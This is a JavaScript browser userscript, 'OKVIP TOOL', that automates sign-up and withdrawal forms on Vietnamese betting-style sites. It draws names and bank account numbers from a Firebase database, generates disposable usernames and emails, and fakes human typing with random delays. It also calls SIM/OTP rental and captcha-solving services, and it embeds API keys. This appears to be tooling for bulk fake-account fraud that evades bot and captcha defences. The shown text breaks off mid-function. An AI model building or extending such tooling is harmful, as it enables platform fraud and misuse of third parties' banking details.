// ============================================================
// OKVIP TOOL — ALL-IN-ONE v6.17
// ============================================================

(function () {
  if (window.__MK_LOADED__) return;
  window.__MK_LOADED__ = true;

  // ===== CHROME STORAGE POLYFILL =====
  if (typeof chrome === 'undefined' || !chrome.storage) {
    window.chrome = window.chrome || {};
    chrome.storage = {
      local: {
        get: function(keys, cb) {
          var result = {};
          var ks = Array.isArray(keys) ? keys : (typeof keys === 'string' ? [keys] : Object.keys(keys));
          ks.forEach(function(k) {
            try { var v = localStorage.getItem(k); result[k] = v ? JSON.parse(v) : undefined; } catch(e) { result[k] = localStorage.getItem(k); }
          });
          if (cb) cb(result);
          return Promise.resolve(result);
        },
        set: function(obj, cb) {
          Object.keys(obj).forEach(function(k) {
            try { localStorage.setItem(k, typeof obj[k] === 'object' ? JSON.stringify(obj[k]) : obj[k]); } catch(e) {}
          });
          if (cb) cb();
          return Promise.resolve();
        }
      }
    };
  }
  // ===== END POLYFILL =====

  // =====================================================
  // ========== PHẦN 1: BANK TOOL (Firebase) ==========
  // =====================================================

  function getPassword()         { return localStorage.getItem("okvip_password")          || ""; }
  function getWithdrawPassword() { return localStorage.getItem("okvip_withdraw_password") || ""; }

  const FIREBASE_CONFIG = {
    apiKey: "AIzaSyBnk8d_B5wuDRAkSfePsuVmmpZqDh4TS7c",
    projectId: "sv1111"
  };

  const FIELD_KEYWORDS = {
    password: ["mật khẩu", "password", "mat khau", "pass"],
    withdraw: ["mật khẩu rút tiền", "mat khau rut tien", "xác nhận mật khẩu rút", "withdraw password", "rút tiền"],
    name:     ["họ và tên", "ho va ten", "họ tên", "full name", "tên thật", "ten that", "tên người", "họ tên thật"],
    stk:      ["số tài khoản ngân hàng", "so tai khoan ngan hang", "stk", "account number", "bank account", "số tk ngân hàng", "nhập số tài khoản"],
    username: ["tên tài khoản", "ten tai khoan", "username", "tài khoản", "tai khoan", "đăng nhập", "login", "nhập tên tài khoản", "account"],
    email:    ["email", "e-mail", "địa chỉ email", "dia chi email", "gmail"]
  };

  // ========== TỈNH THÀNH ==========
  const PROVINCES_34 = [
    "Hà Nội","Hồ Chí Minh","Hải Phòng","Đà Nẵng","Cần Thơ",
    "An Giang","Bà Rịa - Vũng Tàu","Bắc Giang","Bắc Kạn","Bạc Liêu",
    "Bắc Ninh","Bến Tre","Bình Dương","Bình Phước","Bình Thuận",
    "Cà Mau","Đắk Lắk","Đắk Nông","Điện Biên","Đồng Nai",
    "Đồng Tháp","Gia Lai","Hà Giang","Hà Nam","Hà Tĩnh",
    "Hải Dương","Hậu Giang","Hòa Bình","Hưng Yên","Khánh Hòa",
    "Kiên Giang","Kon Tum","Lai Châu","Lạng Sơn"
  ];

  const PROVINCES_63 = [
    "Hà Nội","Hồ Chí Minh","Hải Phòng","Đà Nẵng","Cần Thơ",
    "An Giang","Bà Rịa - Vũng Tàu","Bắc Giang","Bắc Kạn","Bạc Liêu",
    "Bắc Ninh","Bến Tre","Bình Định","Bình Dương","Bình Phước",
    "Bình Thuận","Cà Mau","Cao Bằng","Đắk Lắk","Đắk Nông",
    "Điện Biên","Đồng Nai","Đồng Tháp","Gia Lai","Hà Giang",
    "Hà Nam","Hà Tĩnh","Hải Dương","Hậu Giang","Hòa Bình",
    "Hưng Yên","Khánh Hòa","Kiên Giang","Kon Tum","Lai Châu",
    "Lâm Đồng","Lạng Sơn","Lào Cai","Long An","Nam Định",
    "Nghệ An","Ninh Bình","Ninh Thuận","Phú Thọ","Phú Yên",
    "Quảng Bình","Quảng Nam","Quảng Ngãi","Quảng Ninh","Quảng Trị",
    "Sóc Trăng","Sơn La","Tây Ninh","Thái Bình","Thái Nguyên",
    "Thanh Hóa","Thừa Thiên Huế","Tiền Giang","Trà Vinh","Tuyên Quang",
    "Vĩnh Long","Vĩnh Phúc","Yên Bái"
  ];

  function getCityInput() {
    const byFC = document.querySelector('input[formcontrolname="city"]');
    if (byFC) return byFC;
    const byPH = [...document.querySelectorAll('input')].find(el =>
      /thành phố|thanh pho|tỉnh thành|tinh thanh|city|province/i.test(el.placeholder||"")
    );
    if (byPH) return byPH;
    const KW = /city|province|tỉnh|tinh/i;
    return [...document.querySelectorAll('input')].find(el => {
      if (["hidden","checkbox","radio","submit","button","file","image"].includes((el.type||"text").toLowerCase())) return false;
      return KW.test(el.placeholder||"") || KW.test(el.name||"") ||
             KW.test(el.id||"") || KW.test(el.getAttribute("formcontrolname")||"") ||
             KW.test(el.getAttribute("aria-label")||"");
    }) || null;
  }

  // ========== NICK GEN ==========
  const NICK_PREFIXES  = ["vip","pro","king","god","hot","ace","top","win","gg","xin","dep","real","the","mr","ms","boss","cool","best","vn","x"];
  const NICK_SUFFIXES  = ["vip","pro","king","gg","win","official","real","vn","x","gaming","tv","plus","ez","op"];

  function removeDiacritics(str) {
    return str.normalize("NFD").replace(/[̀-ͯ]/g,"").replace(/đ/g,"d").replace(/Đ/g,"D");
  }

  function parseName(fullName) {
    const parts = removeDiacritics(fullName).toLowerCase().trim().split(/\s+/);
    const first  = parts[parts.length - 1];
    const last   = parts[0];
    const middle = parts.length > 2 ? parts.slice(1, -1).join("") : "";
    return { first, last, middle, parts };
  }

  function randInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
  function randPad(n)   { return String(randInt(0,99)).padStart(n,"0"); }
  function randDDMM()   { const d=randInt(1,28),m=randInt(1,12); return String(d).padStart(2,"0")+String(m).padStart(2,"0"); }
  function pickRand(arr){ return arr[Math.floor(Math.random()*arr.length)]; }

  function sanitizeNick(val) {
    let s = val.replace(/[^a-z0-9]/gi, '');
    if(s.length < 2) s = s + String(randInt(10,99));
    if(s.length > 15) s = s.slice(0, 15);
    return s;
  }

  function genNickOptions(fullName) {
    const { first, last, parts } = parseName(fullName);
    const pre = pickRand(NICK_PREFIXES);
    const suf = pickRand(NICK_SUFFIXES);
    const ddmm = randDDMM();
    const r2 = randPad(2);
    const r4 = String(randInt(1000,9999));
    const midInitials = parts.slice(1,-1).map(p=>p[0]).join("");

    return [
      { label: "Họ + tiền tố + 2 số",        value: sanitizeNick(`${last}${pre}${r2}`) },
      { label: "Tên + tiền tố",               value: sanitizeNick(`${first}${pre}`) },
      { label: "Họ + tên + 2 số",             value: sanitizeNick(`${last}${first}${r2}`) },
      { label: "Họ + ngày sinh (ddmm)",        value: sanitizeNick(`${last}${ddmm}`) },
      { label: "Tên + ngày sinh",             value: sanitizeNick(`${first}${ddmm}`) },
      { label: "Họ + tên + ngày sinh",        value: sanitizeNick(`${last}${first}${ddmm}`) },
      { label: "Họ + đệm viết tắt + tên",    value: sanitizeNick(`${last}${midInitials}${first}`) },
      { label: "Tiền tố + họ + tên",          value: sanitizeNick(`${pre}${last}${first}`) },
      { label: "Họ + tên + hậu tố",           value: sanitizeNick(`${last}${first}${suf}`) },
      { label: "Họ + 4 số",                   value: sanitizeNick(`${last}${r4}`) },
      { label: "Tên + 4 số",                  value: sanitizeNick(`${first}${r4}`) },
      { label: "Họ + tên + 4 số",             value: sanitizeNick(`${last}${first}${r4}`) },
      { label: "Chỉ họ + số",                 value: sanitizeNick(`${last}${r2}`) },
      { label: "Chỉ tên + số",                value: sanitizeNick(`${first}${r2}`) },
    ];
  }

  // ========== EMAIL GEN ==========
  const EMAIL_DOMAINS = ["gmail.com","gmail.com","gmail.com","yahoo.com","outlook.com"];
  const EMAIL_WORDS   = ["vip","pro","win","top","ace","king","real","hot","gg","x","plus","ez","ok","88","68","99","2k","nx"];

  function genEmailOptions(fullName) {
    const { first, last } = parseName(fullName);
    const w = pickRand(EMAIL_WORDS);
    const r2 = randPad(2);
    const r4 = String(randInt(1000,9999));
    const ddmm = randDDMM();
    const dom = pickRand(EMAIL_DOMAINS);
    return [
      { label: "Họ + tên + 2 số",        value: `${last}${first}${r2}@${dom}` },
      { label: "Họ + tên + 4 số",        value: `${last}${first}${r4}@${dom}` },
      { label: "Tên + từ + 2 số",        value: `${first}${w}${r2}@${dom}` },
      { label: "Họ + từ + 4 số",         value: `${last}${w}${r4}@${dom}` },
      { label: "Họ + tên + ngày sinh",   value: `${last}${first}${ddmm}@${dom}` },
      { label: "Tên + ngày sinh",        value: `${first}${ddmm}@${dom}` },
      { label: "Họ + ngày sinh + 2 số",  value: `${last}${ddmm}${r2}@${dom}` },
      { label: "Họ + tên",               value: `${last}${first}@${dom}` },
    ];
  }

  function getEmailInput() {
    const byFC = document.querySelector('input[formcontrolname="email"], input[placeholder="Địa chỉ Email"], input[placeholder="Email"], input[placeholder="Nhập Email"], input[placeholder="Nhập email"]');
    if (byFC) return byFC;
    return findInputByKeywords(FIELD_KEYWORDS.email);
  }

  function getUsernameInput() {
    const byWFull = [...document.querySelectorAll('input[type="text"]')].find(el =>
      /nhập tên tài khoản|nhap ten tai khoan/i.test(el.placeholder||"") &&
      el.classList.contains("w-full") && !el.classList.contains("mx-auto")
    );
    if (byWFull) return byWFull;
    const byData = document.querySelector('input[data-input-name="account"], input[data-input-name="username"]');
    if (byData) return byData;
    const byNameAttr = document.querySelector('input[name="username"]');
    if (byNameAttr) return byNameAttr;
    const byFC = document.querySelector('input[formcontrolname="account"]');
    if (byFC) {
      const ph = byFC.placeholder || "";
      if (/tên|ten|username/i.test(ph)) return byFC;
      if (/2[-–]15|ký tự|ky tu|chữ cái|chu cai|gạch dưới|gach duoi/i.test(ph)) return byFC;
      if (/\d{6,}/.test(ph)) return null;
      return byFC;
    }
    const byPH = [...document.querySelectorAll('input')].find(el =>
      /tên người dùng|ten nguoi dung|nhập tên tài khoản|nhap ten tai khoan/i.test(el.placeholder||"")
    );
    if(byPH) return byPH;
    const bySpanLabel = [...document.querySelectorAll('input[type="text"]')].find(el => {
      const prev = el.closest('div,section,form,li')?.querySelector('span,label,p');
      return prev && /vui lòng nhập tên tài khoản|nhập tên tài khoản/i.test(prev.textContent||"");
    });
    if(bySpanLabel) return bySpanLabel;
    const foundUser = findInputByKeywords(FIELD_KEYWORDS.username);
    if (foundUser && /bankCard/i.test(foundUser.name || "")) return null;
    if (foundUser && foundUser.type === "password") return null;
    if (foundUser && document.querySelector('input[formcontrolname="newPassword"], input[formcontrolname="oldPassword"]')) return null;
    return foundUser;
  }

  async function showNickPicker(fullName, onSelect) {
    let currentOptions = genNickOptions(fullName);

    const overlay = document.createElement("div");
    overlay.style.cssText = "position:fixed;inset:0;z-index:2147483646;background:rgba(0,0,0,0.45);display:flex;align-items:center;justify-content:center;";

    const box = document.createElement("div");
    box.style.cssText = "background:#fff;border-radius:12px;width:90vw;max-width:380px;max-height:80vh;display:flex;flex-direction:column;box-shadow:0 8px 32px rgba(0,0,0,0.25);overflow:hidden;font-family:-apple-system,Arial,sans-serif;";
    box.innerHTML = `
      <div style="padding:12px 16px;background:#1a73e8;color:#fff;font-weight:700;font-size:14px;display:flex;justify-content:space-between;align-items:center;">
        🆔 Chọn Username
        <button id="__nk_close__" style="background:none;border:none;color:#fff;font-size:22px;cursor:pointer;line-height:1;">✕</button>
      </div>
      <div style="padding:6px 12px;background:#e8f0fe;font-size:12px;color:#1a73e8;font-weight:600;">
        👤 <b>${fullName}</b>
      </div>
      <div id="__nk_list__" style="overflow-y:auto;flex:1;padding:4px 0;-webkit-overflow-scrolling:touch;"></div>
    `;
    overlay.appendChild(box);
    document.body.appendChild(overlay);

    function renderOptions(opts) {
      const listEl = box.querySelector("#__nk_list__");
      listEl.innerHTML = "";
      opts.forEach((o, idx) => {
        const row = document.createElement("div");
        row.style.cssText = "padding:8px 10px;border-bottom:1px solid #f0f0f0;display:flex;align-items:center;gap:8px;";
        row.innerHTML = `
          <div style="flex:1;min-width:0;">
            <div style="font-weight:700;font-size:13px;color:#111;font-family:monospace;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;" id="__nk_val_${idx}__">${o.value}</div>
            <div style="font-size:10px;color:#999;margin-top:1px;">${o.label}</div>
          </div>
          <button data-idx="${idx}" class="__nk_pick__" style="padding:5px 10px;background:#1a73e8;color:#fff;border:none;border-radius:6px;font-size:12px;font-weight:700;cursor:pointer;flex-shrink:0;white-space:nowrap;">✅ Chọn</button>
          <button data-idx="${idx}" class="__nk_rand__" style="padding:5px 8px;background:#f0ad4e;color:#fff;border:none;border-radius:6px;font-size:13px;cursor:pointer;flex-shrink:0;">🎲</button>
        `;
        listEl.appendChild(row);
      });

      listEl.querySelectorAll(".__nk_pick__").forEach(btn => {
        btn.addEventListener("click", () => {
          const idx = parseInt(btn.dataset.idx);
          onSelect(currentOptions[idx].value);
          close();
        });
      });

      listEl.querySelectorAll(".__nk_rand__").forEach(btn => {
        btn.addEventListener("click", () => {
          const idx = parseInt(btn.dataset.idx);
          const freshAll = genNickOptions(fullName);
          currentOptions[idx] = freshAll[idx];
          const valEl = listEl.querySelector(`#__nk_val_${idx}__`);
          if (valEl) valEl.textContent = currentOptions[idx].value;
        });
      });
    }

    const close = () => overlay.remove();
    overlay.addEventListener("click", e => { if (e.target === overlay) close(); });
    box.querySelector("#__nk_close__").addEventListener("click", close);

    renderOptions(currentOptions);
  }

  function findInputByKeywords(keywords, type = null) {
    const allInputs = document.querySelectorAll("input");
    const matched = [];
    for (const input of allInputs) {
      const t = (input.type || "text").toLowerCase();
      if (["hidden","checkbox","radio","submit","button","file","image"].includes(t)) continue;
      if (type && t !== type) continue;
      const sources = [
        input.placeholder || "",
        input.getAttribute("aria-label") || "",
        input.name || "",
        input.id || "",
      ];
      if (input.id) {
        const label = document.querySelector(`label[for="${input.id}"]`);
        if (label) sources.push(label.textContent || "");
      }
      const parentLabel = input.closest("label");
      if (parentLabel) sources.push(parentLabel.textContent || "");
      const combined = sources.join(" ").toLowerCase();
      if (keywords.some(kw => combined.includes(kw.toLowerCase()))) matched.push(input);
    }
    return matched.find(el => el.getBoundingClientRect().width > 0) || matched[0] || null;
  }

  const WITHDRAW_FCNAMES = ["newPassword","confirm","newpassword","confirmpassword","oldPassword","oldpassword"];

  function isWithdrawInput(el) {
    if (!el) return false;
    const fc = el.getAttribute("formcontrolname") || "";
    if (WITHDRAW_FCNAMES.includes(fc)) return true;
    const ph = el.placeholder || "";
    if (/mật khẩu rút|mat khau rut|xác nhận.*mật khẩu|withdraw/i.test(ph)) return true;
    const id = el.id || "";
    if (/pin|withdraw|rut/i.test(id)) return true;
    if (/confirm/i.test(id) && !/bank|account|stk/i.test(id)) return true;
    return false;
  }

  function getPasswordInput() {
    const all = [...document.querySelectorAll("input[type='password'], input[type='text']")];
    const pw = all.find(el => {
      if (isWithdrawInput(el)) return false;
      if (el.type === "password") return true;
      const sources = [el.placeholder||"", el.getAttribute("aria-label")||"", el.name||"", el.id||""].join(" ").toLowerCase();
      return FIELD_KEYWORDS.password.some(kw => sources.includes(kw.toLowerCase()));
    });
    return pw || null;
  }

  function getWithdrawInputs() {
    const byFC = [
      document.querySelector('input[formcontrolname="newPassword"]'),
      document.querySelector('input[formcontrolname="confirm"]'),
    ].filter(Boolean);
    if (byFC.length) return byFC;
    const byId = [...document.querySelectorAll('input[type="password"]')].filter(el =>
      /pin|withdraw|rut/i.test(el.id || "") || /confirm/i.test(el.id || "")
    );
    if (byId.length) return byId;
    const KW = /mật khẩu rút|mat khau rut|xác nhận.*mật khẩu rút|withdraw.*pass|mã pin|ma pin/i;
    return [...document.querySelectorAll('input')].filter(el =>
      KW.test(el.placeholder || "") || KW.test(el.getAttribute("aria-label") || "")
    );
  }

  function clickEyeIcon(inputEl) {
    const container = inputEl.closest("fieldset, div, label, section") || inputEl.parentElement;
    if (!container) return;
    const eye = container.querySelector('i.fa-eye, i[class*="eye"], i[class*="icon-eye"]');
    if (eye) eye.click();
  }

  function getNameInput() {
    const byName = document.querySelector('input[name="payeeName"], input[name="realName"], input[name="fullName"], input[name="full_name"]');
    if(byName) return byName;
    const byFC = document.querySelector('input[formcontrolname="payeeName"], input[formcontrolname="realName"], input[formcontrolname="fullName"], input[formcontrolname="name"]');
    if(byFC) return byFC;
    const EXCLUDE = /tên người dùng|ten nguoi dung|tên tài khoản|ten tai khoan|username|account|password|mật khẩu/i;
    const allInputs = document.querySelectorAll("input");
    for(const input of allInputs) {
      const t = (input.type||"text").toLowerCase();
      if(["hidden","checkbox","radio","submit","button","file","image","password"].includes(t)) continue;
      const sources = [
        input.placeholder||"", input.getAttribute("aria-label")||"",
        input.name||"", input.id||"",
        input.getAttribute("formcontrolname")||"",
      ];
      const combined = sources.join(" ").toLowerCase();
      if(EXCLUDE.test(combined)) continue;
      if(FIELD_KEYWORDS.name.some(kw => combined.includes(kw.toLowerCase()))) return input;
    }
    return null;
  }

  function getStkInput() {
    const byBankCard = document.querySelector('input[name="bankCard"]');
    if (byBankCard) return byBankCard;
    const byId = document.querySelector('input[id="bankaccount"], input[id="bankAccount"], input[id="bank_account"], input[id="BankAccount"]');
    if (byId) return byId;
    const byFC = document.querySelector('input[formcontrolname="account"]');
    if (byFC) {
      const ph = byFC.placeholder || "";
      if (/\d{6,}/.test(ph)) return byFC;
    }
    return findInputByKeywords(FIELD_KEYWORDS.stk);
  }

  function getConfirmUsernameInput() {
    return [...document.querySelectorAll('input[type="text"]')].find(el =>
      (/nhập tên tài khoản|nhap ten tai khoan/i.test(el.placeholder||"") &&
      el.classList.contains("w-full") && el.classList.contains("mx-auto")) ||
      /nhập tài khoản|nhap tai khoan/i.test(el.placeholder||"")
    ) || null;
  }

  function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
  function rand(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }

  function getReactProps(el) {
    const key = Object.keys(el).find(k => k.startsWith("__reactProps"));
    return key ? el[key] : null;
  }

  async function typeIntoInput(input, text) {
    if (!input) return false;
    const nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
    input.click(); await sleep(60);
    input.focus(); await sleep(rand(80, 140));
    nativeSetter.call(input, "");

    const props = getReactProps(input);
    if (props && props.onChange) {
      nativeSetter.call(input, text);
      props.onChange({ target: input, currentTarget: input, bubbles: true, type: "change" });
      await sleep(50);
      input.dispatchEvent(new Event("input", { bubbles: true }));
      input.dispatchEvent(new Event("change", { bubbles: true }));
      await sleep(100);
      input.dispatchEvent(new FocusEvent("blur", { bubbles: true }));
      await sleep(50);
      input.dispatchEvent(new FocusEvent("focus", { bubbles: true }));
      return true;
    }

    input.dispatchEvent(new Event("input", { bubbles: true }));
    await sleep(rand(30, 60));
    for (const char of text) {
      const keyCode = char.charCodeAt(0);
      const code = char >= "0" && char <= "9" ? `Digit${char}` : `Key${char.toUpperCase()}`;
      input.dispatchEvent(new KeyboardEvent("keydown",  { key: char, code, keyCode, which: keyCode, bubbles: true, cancelable: true, composed: true }));
      await sleep(7);
      input.dispatchEvent(new KeyboardEvent("keypress", { key: char, code, keyCode, which: keyCode, charCode: keyCode, bubbles: true, cancelable: true, composed: true }));
      await sleep(4);
      nativeSetter.call(input, input.value + char);
      input.dispatchEvent(new InputEvent("beforeinput", { inputType: "insertText", data: char, bubbles: true, cancelable: true }));
      input.dispatchEvent(new InputEvent("input",       { inputType: "insertText", data: char, bubbles: true, cancelable: false, composed: true }));
      await sleep(5);
      input.dispatchEvent(new KeyboardEvent("keyup",    { key: char, code, keyCode, which: keyCode, bubbles: true, cancelable: true, composed: true }));
      await sleep(rand(35, 90));
    }
    await sleep(rand(100, 180));
    input.dispatchEvent(new Event("change", { bubbles: true }));
    await sleep(rand(50, 100));
    input.dispatchEvent(new FocusEvent("blur",  { bubbles: true }));
    await sleep(50);
    input.dispatchEvent(new FocusEvent("focus", { bubbles: true }));
    return true;
  }

  async function fetchAccounts() {
    const url = `https://firestore.googleapis.com/v1/projects/${FIREBASE_CONFIG.projectId}/databases/(default)/documents/accounts?key=${FIREBASE_CONFIG.apiKey}&pageSize=100`;
    try {
      const res = await fetch(url);
      const json = await res.json();
      if (!json.documents) return [];
      return json.documents.map(doc => {
        const f = doc.fields || {};
        return { name: f.name?.stringValue || "", account: f.account?.stringValue || "", tag: f.tag?.stringValue || "", tgChatId: f.tgChatId?.stringValue || "" };
      }).filter(a => a.name);
    } catch (e) { return []; }
  }

  let pickerOpen = false;
  async function showPicker(onSelect) {
    if (pickerOpen) return;
    pickerOpen = true;

    const overlay = document.createElement("div");
    overlay.style.cssText = "position:fixed;inset:0;z-index:2147483646;background:rgba(0,0,0,0.45);display:flex;align-items:center;justify-content:center;";

    const box = document.createElement("div");
    box.style.cssText = "background:#fff;border-radius:12px;width:90vw;max-width:360px;max-height:80vh;display:flex;flex-direction:column;box-shadow:0 8px 32px rgba(0,0,0,0.25);overflow:hidden;font-family:-apple-system,Arial,sans-serif;";
    box.innerHTML = `
      <div style="padding:14px 16px;background:#f60;color:#fff;font-weight:700;font-size:15px;display:flex;justify-content:space-between;align-items:center;">
        📋 Chọn tài khoản
        <button id="__pk_close__" style="background:none;border:none;color:#fff;font-size:22px;cursor:pointer;line-height:1;">✕</button>
      </div>
      <div style="padding:10px 12px;border-bottom:1px solid #eee;">
        <input id="__pk_search__" type="text" placeholder="🔍 Tìm tên hoặc STK..." style="width:100%;padding:9px 10px;border:1.5px solid #ddd;border-radius:8px;font-size:14px;outline:none;box-sizing:border-box;"/>
      </div>
      <div id="__pk_list__" style="overflow-y:auto;flex:1;padding:8px 0;-webkit-overflow-scrolling:touch;">
        <div style="text-align:center;padding:20px;color:#aaa;font-size:13px;">⏳ Đang tải...</div>
      </div>
    `;
    overlay.appendChild(box);
    document.body.appendChild(overlay);

    const close = () => { overlay.remove(); pickerOpen = false; };
    overlay.addEventListener("click", e => { if (e.target === overlay) close(); });
    box.querySelector("#__pk_close__").addEventListener("click", close);

    const accounts = await fetchAccounts();

    function renderList(list) {
      const listEl = box.querySelector("#__pk_list__");
      if (!list.length) { listEl.innerHTML = `<div style="text-align:center;padding:20px;color:#aaa;font-size:13px;">Không có kết quả</div>`; return; }
      listEl.innerHTML = "";
      list.forEach(a => {
        const row = document.createElement("div");
        row.style.cssText = "padding:12px 14px;cursor:pointer;border-bottom:1px solid #f5f5f5;display:flex;justify-content:space-between;align-items:center;";
        row.innerHTML = `
          <div style="min-width:0;flex:1;">
            <div style="font-weight:700;font-size:14px;color:#111;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${a.name}</div>
            <div style="font-size:12px;color:#888;font-family:monospace;">${a.account}</div>
          </div>
          <span style="background:#d7eaff;color:#1a73e8;font-size:11px;font-weight:700;padding:3px 8px;border-radius:20px;margin-left:8px;flex-shrink:0;">${a.tag}</span>
        `;
        row.addEventListener("touchstart", () => row.style.background = "#fff8f0", { passive: true });
        row.addEventListener("touchend",   () => row.style.background = "", { passive: true });
        row.addEventListener("mouseenter", () => row.style.background = "#fff8f0");
        row.addEventListener("mouseleave", () => row.style.background = "");
        row.addEventListener("click", () => { onSelect(a); close(); });
        listEl.appendChild(row);
      });
    }

    renderList(accounts);
    box.querySelector("#__pk_search__").addEventListener("input", e => {
      const kw = e.target.value.trim().toLowerCase();
      renderList(kw ? accounts.filter(a => a.name.toLowerCase().includes(kw) || a.account.includes(kw)) : accounts);
    });
  }

  const LAST_ACCOUNT_KEY  = "okvip_last_account";
  const LAST_USERNAME_KEY = "okvip_last_username";

  async function getHardPhone() {
    let v = "";
    try { v = localStorage.getItem("okvip_hard_phone") || ""; } catch(e) {}
    if (!v) { try { v = await new Promise(res => chrome.storage.local.get(["okvip_hard_phone"], s => res(s["okvip_hard_phone"] || ""))); } catch(e) {} }
    return v;
  }

  async function getHardUsername() {
    let v = "";
    try { v = localStorage.getItem("okvip_hard_username") || ""; } catch(e) {}
    if (!v) {
      try { v = await new Promise(res => chrome.storage.local.get(["okvip_hard_username"], s => res(s["okvip_hard_username"] || ""))); } catch(e) {}
    }
    return v;
  }

  const LAST_PHONE_KEY    = "okvip_last_phone";
  const LAST_STK_KEY      = "okvip_last_stk";
  const LAST_NAME_KEY     = "okvip_last_name_real";

  // ========== CROSS-DOMAIN USERNAME ==========
  // localStorage bị cô lập theo domain
  // → Dùng Firestore project-firebase-49d8c (đã có public read/write, cùng project background.js dùng)
  // → Document: settings/lastBooking  field: username

  const _FS_URL_CD = "https://firestore.googleapis.com/v1/projects/project-firebase-49d8c/databases/(default)/documents/settings/lastBooking?key=AIzaSyAX7fGf0f0gj6AVcwLC6To-Zpv0tgR0UI4";

  async function saveUsernameToFirestore(username) {
    if (!username) return;
    try { localStorage.setItem(LAST_USERNAME_KEY, username); } catch(e) {}
    try {
      await fetch(_FS_URL_CD, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          fields: {
            username:  { stringValue: username },
            ts:        { stringValue: new Date().toISOString() },
            domain:    { stringValue: window.location.hostname },
          }
        })
      });
      console.log("[OKVIP] ✅ Lưu TK cross-domain:", username);
    } catch(e) {
      console.warn("[OKVIP] Lưu cross-domain thất bại:", e.message);
    }
  }

  async function loadUsernameFromFirestore() {
    try {
      const res = await fetch(_FS_URL_CD);
      if (!res.ok) return "";
      const json = await res.json();
      const username = json.fields?.username?.stringValue || "";
      if (username) {
        try { localStorage.setItem(LAST_USERNAME_KEY, username); } catch(e) {}
        console.log("[OKVIP] ✅ Đọc TK cross-domain:", username);
      }
      return username;
    } catch(e) {
      console.warn("[OKVIP] Đọc cross-domain thất bại:", e.message);
      return "";
    }
  }

  // Khi tool load: nếu localStorage trống thì lấy từ Firestore
  (async function initCrossDomainUsername() {
    const localVal = (() => { try { return localStorage.getItem(LAST_USERNAME_KEY) || ""; } catch(e) { return ""; } })();
    if (!localVal) await loadUsernameFromFirestore();
  })();
  // ========== END CROSS-DOMAIN USERNAME ==========

  let lastSelectedAccount = (() => {
    try {
      const v = localStorage.getItem(LAST_ACCOUNT_KEY) || sessionStorage.getItem(LAST_ACCOUNT_KEY);
      return JSON.parse(v || "null");
    } catch(e) { return null; }
  })();

  function setLastAccount(account) {
    lastSelectedAccount = account;
    try { localStorage.setItem(LAST_ACCOUNT_KEY, JSON.stringify(account)); } catch(e) {}
    try { sessionStorage.setItem(LAST_ACCOUNT_KEY, JSON.stringify(account)); } catch(e) {}
    try {
      chrome.storage.local.set({
        [LAST_STK_KEY]:  account.account,
        [LAST_NAME_KEY]: account.name,
        // Lưu tgChatId của account vào storage để doSend dùng
        okvip_account_tg_chatid: account.tgChatId || "",
      });
    } catch(e) {}
    const stkBtn = document.getElementById("__mk_stk_btn__");
    if (stkBtn) {
      stkBtn.innerHTML = `💳 ${account.name.split(" ").pop()}`;
      stkBtn.style.background = "#2e7d32";
      setTimeout(() => { stkBtn.innerHTML = "💳 Điền STK"; stkBtn.style.background = "#f60"; }, 2000);
    }
  }

  // =====================================================
  // ========== PHẦN 2: SIM / OTP TOOL ==========
  // =====================================================

  const SIM_KEY         = "okvip_sims";
  const CURRENT_SIM_KEY = "okvip_current_sim";
  const API_KEY_STORE   = "okvip_api_key";
  const CAPTCHA_KEY_STORE = "okvip_captcha_api_key";
  const ANTICAPTCHA_API = "https://anticaptcha.top/api/captcha";

  const WORKER          = "https://api.dblgamingg.workers.dev";
  const SV2_BASE        = "https://noisy-darkness-b3aa.dblgamingg.workers.dev/api";
  const FIXED_SVC       = 49;
  const APP_ID          = 1200;

  const STK_EXCLUDE = /tài khoản ngân hàng|so tai khoan|số tài khoản|account number|bank account|stk|bankCard|bankcard/i;

  function findPhoneInput() {
    const direct = document.querySelector('input[data-input-name="phone"]');
    if (direct) return direct;
    const byClass = document.querySelector('input.mobile-input, input[class*="mobile-input"], input[class*="phone-input"]');
    if (byClass) return byClass;
    const tel = document.querySelector('input[type="tel"]');
    if (tel) return tel;
    const byMobile = document.querySelector('input[formcontrolname="mobile"]');
    if (byMobile) return byMobile;
    const byTel = document.querySelector('input[type="tel"].inputText, input[type="tel"][placeholder*="điện thoại"], input[type="tel"][placeholder*="Điện thoại"], input[type="tel"][placeholder*="phone"]');
    if (byTel) return byTel;
    const KW = /phone|mobile|sdt|điện thoại|dien thoai|số đt|nhập sđt|nhap sdt|nhập số điện|nhap so dien|số điện|so dien/i;
    const all = [...document.querySelectorAll('input[type="text"],input[type="number"],input[type="tel"]')];
    const byAttr = all.find(el => {
      const combined = [
        el.placeholder||"", el.name||"", el.id||"",
        el.getAttribute("data-input-name")||"",
        el.getAttribute("aria-label")||"",
        el.getAttribute("data-label-name")||"",
        el.className||""
      ].join(" ");
      if (STK_EXCLUDE.test(combined)) return false;
      return KW.test(combined);
    });
    if (byAttr) return byAttr;
    for (const el of all) {
      const attrCombined = [el.placeholder||"", el.name||"", el.id||"", el.getAttribute("data-label-name")||""].join(" ");
      if (STK_EXCLUDE.test(attrCombined)) continue;
      if (el.id) {
        const lbl = document.querySelector(`label[for="${el.id}"]`);
        if (lbl && KW.test(lbl.textContent||"")) return el;
      }
      const parentLbl = el.closest("label");
      if (parentLbl && KW.test(parentLbl.textContent||"")) return el;
      const container = el.closest("div,li,td,tr,section");
      if (container && KW.test(container.textContent||"")) return el;
    }
    return null;
  }

  function findOtpInput() {
    const byData = document.querySelector('input[data-input-name="phoneCode"], input[data-input-name="otp"], input[data-input-name="sms"]');
    if (byData) return byData;
    const bySms = [...document.querySelectorAll('input')].find(el =>
      /nhập mã sms|nhap ma sms/i.test(el.placeholder||"")
    );
    if (bySms) return bySms;
    const KW = /otp|m[aã].? ?x[aá]c|verif|sms/i;
    const CAPTCHA_SKIP = /captcha|xác minh|xac minh/i;
    return [...document.querySelectorAll('input[type="text"],input[type="number"],input[type="tel"]')]
      .find(el => {
        if (el.getAttribute("formcontrolname") === "checkCode") return false;
        const allAttrs = [el.placeholder||"", el.id||"", el.name||""].join(" ");
        if (CAPTCHA_SKIP.test(allAttrs)) return false;
        return KW.test(el.placeholder||"") || KW.test(el.name||"") ||
               KW.test(el.id||"") || KW.test(el.getAttribute("data-input-name")||"") ||
